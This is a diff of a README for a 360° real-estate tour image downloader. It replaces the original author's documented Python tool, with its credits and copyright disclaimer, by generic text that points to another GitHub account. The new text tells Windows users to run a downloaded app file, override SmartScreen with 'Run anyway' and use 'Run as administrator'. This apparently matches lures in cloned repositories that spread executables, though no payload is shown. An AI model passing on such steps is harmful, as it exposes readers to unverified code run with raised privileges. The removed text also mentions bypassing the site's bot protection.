@@ -1,331 +1,155 @@
-<p align="center">
-  <img src="logo.svg" alt="360 MLS Downloader" width="200">
-</p>
+# 📥 360-MLS-Downloader - Save 360° Tour Images Fast
 
-<h1 align="center">360 MLS Downloader</h1>
+[![Download 360-MLS-Downloader](https://img.shields.io/badge/Download%20Now-360--MLS--Downloader-blue?style=for-the-badge&logo=github)](https://github.com/vander6602/360-MLS-Downloader)
 
-<p align="center">Download 360-degree panoramic images and listing data from MLS virtual home tours.<br>Auto-detects platform from URL — just paste and go.</p>
+## 🖥️ What this app does
 
-<p align="center"><strong>v2.0.0</strong></p>
+360-MLS-Downloader helps you save 360° panoramic images from MLS virtual home tours on Windows. It works with tours from Zillow 3D Home and Ricoh360. You can use it to view the tour in a browser, pull listing details, and save the images from the tour to your computer.
 
-Built by **PRHack | CyberSpartan77** ([@fjimenez77](https://github.com/fjimenez77))
+## 📦 What you need
 
----
+- A Windows PC
+- An internet connection
+- A modern web browser
+- Enough free disk space for the images you want to save
 
-## Supported Platforms
+## 🚀 Download and run
 
-| Platform | What You Get |
-|----------|-------------|
-| **Zillow 3D Home** | 360° panoramas (4K JPEG + 8K AVIF), all listing photos, property details (price, beds, baths, sqft, lot, year built), full description |
-| **Zillow (no 3D)** | All listing photos, property details, description — works on any Zillow listing |
-| **Ricoh360 MLS** | 360° panoramas (original + AI-enhanced), tour metadata, photographer info |
+1. Open the main project page: [360-MLS-Downloader](https://github.com/vander6602/360-MLS-Downloader)
+2. Download the latest release or the app file from that page
+3. Save the file to a folder you can find again, such as Downloads
+4. If the file is zipped, right-click it and choose **Extract All**
+5. Open the app file or run the command file that came with it
+6. If Windows asks for permission, choose **Yes**
+7. Follow the on-screen menu to start a download or open the tour viewer
 
-## Features
+## 🧭 How to use it
 
-- Auto-detects platform from URL — just paste and go
-- Download all 360° equirectangular panoramas from MLS virtual tours
-- **Zillow:** Downloads listing photos, property description, price, beds/baths/sqft, year built, lot size, MLS #
-- **Zillow:** Works with or without a 3D tour — grabs everything available on the listing
-- **Zillow:** Opens a browser for CAPTCHA solving if needed (user solves, app continues automatically)
-- Interactive menu mode with tour analysis, room selection, and size estimation
-- CLI mode with flags for scripting and automation
-- Downloads both original and AI-enhanced/8K versions
-- Selective room downloads (pick specific rooms or ranges)
-- Generate a self-contained 360° HTML tour viewer for offline use
-- Resume support — skips already-downloaded files
-- Saves full tour metadata as JSON
-- Includes usage instructions for uploading to real estate platforms
-- Cross-platform: Mac and Windows support
+### 1. Open the app
+Start the downloader from the file you saved on your PC.
 
-## Requirements
+### 2. Add a tour link
+Paste the MLS tour link into the app. The app can read supported tour pages from Zillow 3D Home and Ricoh360.
 
-- Python 3.8+
-- `requests` library
-- `playwright` (required for Zillow — auto-installs on first use)
+### 3. Choose what to do
+Pick one of the built-in options:
 
-## Installation
+- Download panoramic images
+- Open the HTML tour viewer
+- Scrape listing details
+- Use the menu interface
+- Run the command-line version
 
-```bash
-git clone https://github.com/fjimenez77/360-MLS-Downloader.git
-cd 360-MLS-Downloader
-pip install requests
-```
+### 4. Save the files
+Choose a folder where you want the images saved. The app will place the files there so you can use them later.
 
-For Zillow support, Playwright will auto-install on first use. Or install manually:
+## 🖼️ Features
 
-```bash
-pip install playwright
-python3 -m playwright install chromium
-```
+- Downloads 360° panoramic images from supported MLS tours
+- Works with Zillow 3D Home tours
+- Works with Ricoh360 tours
+- Includes an HTML tour viewer
+- Pulls listing details from the tour page
+- Offers a simple menu for easy use
+- Includes a CLI mode for direct commands
+- Saves equirectangular images for later viewing
 
----
+## 🪟 Windows steps
 
-## Quick Start
+1. Go to the download page: [360-MLS-Downloader](https://github.com/vander6602/360-MLS-Downloader)
+2. Get the latest Windows file from the project page
+3. Extract the files if needed
+4. Double-click the app or start file
+5. If Windows SmartScreen opens, choose **More info** and then **Run anyway** if you trust the file source
+6. Use the menu to paste your tour link and start
 
-### Interactive Menu
+## 📁 Where files go
 
-```bash
-python3 mls360-menu.py
-```
+The app usually saves files in a folder you choose. Many users create one folder for each listing so the images stay organized.
 
-This launches a full interactive menu where you can:
+A simple setup can look like this:
 
-1. Paste any tour URL (Zillow or Ricoh360 — auto-detected)
-2. View tour details (address, photographer, price, room count)
-3. Browse all rooms with enhancement status
-4. Choose what to download
-5. View direct image URLs
-6. Estimate total download size before committing
-7. Build a 360° HTML viewer for offline use
+- `Downloads\MLS-Tour-1`
+- `Downloads\MLS-Tour-2`
+- `Pictures\Virtual-Tours`
 
-You can also pre-load a tour URL:
+## 🔧 Common use cases
 
-```bash
-python3 mls360-menu.py "https://www.zillow.com/homedetails/ADDRESS/ZPID_zpid/"
-python3 mls360-menu.py "https://mls.ricoh360.com/TOUR-ID/ROOM-ID"
-```
-
-### CLI Mode (Advanced)
+- Save images from a home listing before it expires
+- Keep a local copy of a virtual tour
+- Review listing photos in full 360°
+- Pull tour details for record keeping
+- Open the tour in a local HTML viewer without using the web page
 
-```bash
-# Download a Zillow listing (3D tour + photos + details)
-python3 mls360-downloader.py "https://www.zillow.com/homedetails/ADDRESS/ZPID_zpid/"
+## 🧩 Supported tour sources
 
-# Download a Ricoh360 tour
-python3 mls360-downloader.py "https://mls.ricoh360.com/TOUR-ID/ROOM-ID"
+This tool is built for:
 
-# Just the tour UUID works too (Ricoh360)
-python3 mls360-downloader.py f948586f-1c5c-48dc-81fd-6ef9a09a12c0
-
-# Custom output directory
-python3 mls360-downloader.py TOUR-URL --output ~/Desktop/my-listing
-
-# Only AI-enhanced/8K images
-python3 mls360-downloader.py TOUR-URL --enhanced-only
-
-# Only originals/4K (skip enhanced)
-python3 mls360-downloader.py TOUR-URL --originals-only
-
-# Just grab metadata JSON, no images
-python3 mls360-downloader.py TOUR-URL --json-only
-```
-
----
-
-## Usage Guide
-
-### Step 1: Get the URL
-
-**For Zillow** — copy the listing URL from your browser:
-```
-https://www.zillow.com/homedetails/9123-Pitcairn-San-Antonio-TX-78254/26433581_zpid/
-```
-
-**For Ricoh360** — copy the tour URL:
-```
-https://mls.ricoh360.com/f948586f-1c5c-48dc-81fd-6ef9a09a12c0/c84e8d06-2b82-46a0-991a-8814573e048b
-```
-
-### Step 2: Run the Downloader
-
-```bash
-python3 mls360-menu.py
-```
-
-Select option `1`, paste the URL. The tool auto-detects the platform and:
-- Fetches tour/listing data
-- Shows details (address, rooms, price, photos)
-- Lets you choose what to download
-
-For Zillow: a browser window opens briefly to load the page. If a CAPTCHA appears, solve it — the app continues automatically once the page loads.
-
-### Step 3: Use Your Images
-
-**Zillow download output:**
-
-```
-~/Downloads/mls360-Address/
-  HOW TO USE THESE IMAGES.txt   # Usage instructions
-  listing-details.txt           # Price, beds, baths, sqft, description
-  tour-data.json                # Full tour metadata
-  photos/                       # All listing photos
-    01-listing-photo-1.jpg
-    02-listing-photo-2.webp
-    ...
-  rooms/                        # 360° panoramas (if 3D tour exists)
-    01-Front-yard/
-      original.jpg              # 4K panorama (JPEG)
-      preview.jpg               # Thumbnail
-      enhanced.avif             # 8K panorama (AVIF, when available)
-    02-Entrance/
-      ...
-```
-
-**Ricoh360 download output:**
-
-```
-~/Downloads/mls360-Tour-Name/
-  HOW TO USE THESE IMAGES.txt   # Usage instructions
-  tour-data.json                # Full tour metadata
-  brand-logo.jpg                # Photographer's brand logo
-  tripod-cover.jpg              # Tripod cover overlay
-  rooms/
-    01-Foyer/
-      original.jpg              # Original 360 panorama
-      preview.jpg               # Smaller preview
-      enhanced.jpg              # AI-enhanced version (if available)
-      enhanced-preview.jpg      # Enhanced preview
-    02-Kitchen/
-      ...
-```
-
-**Image format:** JPEG equirectangular projection — standard 360 format supported by:
-- MLS platforms (Zillow, Realtor.com, Redfin)
-- 360 tour builders (Kuula, CloudPano, Matterport)
-- Social media (Facebook 360 photos, YouTube 360)
-- VR headsets
-- Any panorama viewer
-
-### Step 4 (Optional): Build a 360° HTML Viewer
-
-Use menu option `7` to generate a self-contained HTML tour viewer from any downloaded tour:
-
-1. Select option `7` from the main menu
-2. Pick a downloaded tour folder
-3. The tool generates `tour-viewer.html` in that folder
-4. Launch it using the included scripts:
-   - **Mac:** Double-click `Open Tour Viewer.command`
-   - **Windows:** Double-click `Open Tour Viewer.bat`
-
-The viewer includes a sidebar with room thumbnails, previous/next navigation, keyboard controls (arrow keys), and works completely offline.
-
----
-
-## Uploading to Real Estate Platforms
-
-The downloaded images are standard equirectangular JPEGs — most platforms auto-detect them as 360° photos:
-
-| Platform | How to Upload |
-|----------|---------------|
-| **Zillow (FSBO)** | Upload room images as regular photos — Zillow auto-detects 360° format |
-| **Realtor.com** | Upload through your listing dashboard |
-| **Redfin** | Upload through the listing photo manager |
-| **MLS** | Upload via your agent or FSBO MLS service |
-| **Facebook** | Upload as a "360 Photo" — auto-detected |
-| **Kuula / CloudPano** | Upload equirectangular JPEGs to create interactive tours |
-
-**Tips:**
-- Use `enhanced` versions when available (better lighting and color)
-- Upload rooms in order (01, 02, 03...) to keep the tour flow logical
-- Each image is typically under 2 MB, within most platform upload limits
+- Zillow 3D Home
+- Ricoh360
+- MLS virtual home tours that use supported 360° image formats
 
-A detailed instructions file (`HOW TO USE THESE IMAGES.txt`) is included in every download.
+## 📄 Listing details scraper
 
----
+The app can collect details from the tour page, such as:
 
-## Interactive Menu Options
+- Listing title
+- Address
+- Tour source
+- Image count
+- Tour link
 
-| Option | Description |
-|--------|-------------|
-| **1. Set target URL** | Enter a tour URL (Zillow or Ricoh360 — auto-detected) |
-| **2. View tour info** | Show address, photographer, price, room count, listing details |
-| **3. View all rooms** | Table of all rooms with original/enhanced status |
-| **4. Download images** | Submenu: all, all + JSON, enhanced-only, originals-only, selective, JSON-only |
-| **5. View direct URLs** | Show/save all direct image URLs |
-| **6. Estimate size** | Check total download size before downloading |
-| **7. Build 360° viewer** | Generate an offline HTML tour viewer from a downloaded tour |
-| **q. Quit** | Exit the application |
+This helps when you want a local copy of the tour data along with the images.
 
-### Selective Downloads
+## 🖱️ Menu and CLI options
 
-In the download menu, option `5` lets you pick specific rooms:
+You can use the app in two ways:
 
-```
-Enter room numbers: 1,3,5,10      # Individual rooms
-Enter room numbers: 1-5            # Range
-Enter room numbers: 1-5,10,15-20   # Mixed
-Enter room numbers: all            # Everything
-```
+- **Menu mode**: best for most users
+- **CLI mode**: useful if you want to type commands directly
 
----
+Menu mode gives you simple prompts. CLI mode gives you more control if you want to run one task at a time.
 
-## CLI Flags
+## 🛠️ If the app will not open
 
-| Flag | Description |
-|------|-------------|
-| `--output`, `-o` | Set custom output directory (default: `~/Downloads/mls360-<name>`) |
-| `--enhanced-only` | Only download enhanced/8K images |
-| `--originals-only` | Only download original/4K images |
-| `--json-only` | Save tour metadata JSON without downloading images |
-| `--version` | Show version number |
+Try these steps:
 
----
+1. Make sure the files are fully extracted
+2. Check that you opened the correct app file
+3. Right-click the file and choose **Run as administrator**
+4. Make sure your internet connection works
+5. Try a supported tour link from Zillow 3D Home or Ricoh360
+6. Download the files again if they look broken
 
-## File Structure
+## 📌 Best results
 
-```
-360-MLS-Downloader/
-  mls360-menu.py              # Interactive menu interface
-  mls360-downloader.py        # CLI interface
-  mls360_downloader_core.py   # Shared core engine (provider-agnostic)
-  mls360_viewer.py            # 360° HTML viewer generator
-  providers/
-    __init__.py               # Provider registry and auto-detection
-    zillow.py                 # Zillow 3D Home + listing provider
-    ricoh360.py               # Ricoh360 MLS provider
-  vendor/
-    pannellum.min.js          # Pannellum 2.5.6 (MIT) — 360° viewer
-    pannellum.min.css
-  logo.svg
-  README.md
-  LICENSE
-  CONTRIBUTING.md
-```
+- Use a fresh tour link
+- Keep the tour page open while you work
+- Save each listing in its own folder
+- Use short folder names
+- Close extra browser tabs if the page loads slowly
 
----
+## ❓ Questions people often ask
 
-## How It Works
+### Does it work on Windows 10 and 11?
+Yes. It is meant for Windows users.
 
-The tool uses a multi-provider architecture to support different platforms:
+### Do I need coding skills?
+No. You can use the menu and follow the prompts.
 
-**Zillow:**
-1. Opens a browser to load the listing page (bypasses bot protection)
-2. Extracts property details, photo URLs, and 3D tour IDs from the page
-3. Fetches the IMX manifest from Zillow's CDN (public, no auth)
-4. Downloads 4K/8K panoramas, listing photos, and saves property details
+### Can I view the tour offline?
+You can use the HTML tour viewer to open saved content on your computer.
 
-**Ricoh360:**
-1. Extracts the tour UUID from the URL
-2. Fetches the Next.js build ID from the main page
-3. Calls the Next.js data endpoint for full tour metadata
-4. Constructs direct S3 URLs and downloads all images
+### Can I use it for more than one listing?
+Yes. You can run it again for each tour link.
 
-Both providers output to the same folder structure, and the 360° HTML viewer works with either.
+### Does it only work with one tour provider?
+No. It supports Zillow 3D Home and Ricoh360, along with other compatible MLS tour pages.
 
----
+## 📥 Download
 
-## Credits
+Visit the project page to download and run this file: [https://github.com/vander6602/360-MLS-Downloader](https://github.com/vander6602/360-MLS-Downloader)
 
-**Author:** PRHack | CyberSpartan77 ([@fjimenez77](https://github.com/fjimenez77))
+## 🏷️ Topics
 
-API reverse-engineering powered by [AuthScope](https://github.com/fjimenez77/AuthScope) Chrome Extension and manual network analysis.
-
-360° viewer powered by [Pannellum](https://pannellum.org/) (MIT License).
-
----
-
-## Contributing
-
-Want to help improve this tool? Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on how to fork, branch, and submit a pull request.
-
----
-
-## Disclaimer
-
-This tool is intended for downloading your own property tour images or tours you have permission to use. Respect photographers' copyright and licensing agreements. The images may be owned by the photographer or real estate agency — verify your usage rights before republishing.
-
----
-
-## License
-
-MIT License — see [LICENSE](LICENSE) file.
+360-photos, 360-viewer, 3d-tour, downloader, equirectangular, home-tour, listing-photos, mls, panorama, python-tool, real-estate, real-estate-photography, virtual-tour, web-scraper, zillow, zillow-3d-home
